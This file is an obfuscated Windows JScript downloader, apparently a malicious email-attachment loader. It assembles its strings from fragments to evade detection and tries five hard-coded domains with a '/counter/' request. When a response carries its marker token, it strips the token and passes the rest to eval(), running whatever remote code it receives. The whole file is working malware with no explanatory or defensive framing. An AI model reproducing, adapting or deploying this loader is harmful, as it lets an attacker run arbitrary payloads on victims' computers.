
var x = "yst.orlyreznik.com palmspringsevents.net steelglossary.com haveniconnect.com beautifulreflections.purepointdesign.com".split(" ");
var m = "0000001DXLHkdSCS58A5mM2BLdw6qY11awCXB5PvrWsE9pDQhl3oXM2EbbN7Gbi455btxEyEwYyWKA4UmxvZDCPQS4LmFR_XtZZWu3A-_bHkd8Yn2fw";
var zx = 'p';
var amn = 'h';
for (var i=0; i<x.length; i++)
{	
	var e = WScript.CreateObject("M"+"SXML2.XMLHTTP");
	try
	{
		var ih = "G"+"E"+"T";
		var tjkh = x[i];
		var zn = '/';
		var kt = 't';
		e.open(ih, 
		amn+""+"t"+""+kt+""+zx+":"+zn+zn+tjkh+zn+"counter"+""+zn+""+"?"+m,
		
		false);
		e.send();

		var r = e.responseText;
		var mip = 50+450+500;
		if (r.length > mip && r.indexOf(m) > (mip+1-1002))
		{
			var ikagdh = r.split(m).join("a");
			eval(ikagdh);

			break;
		};
	}
	catch(e)
	{
	};
};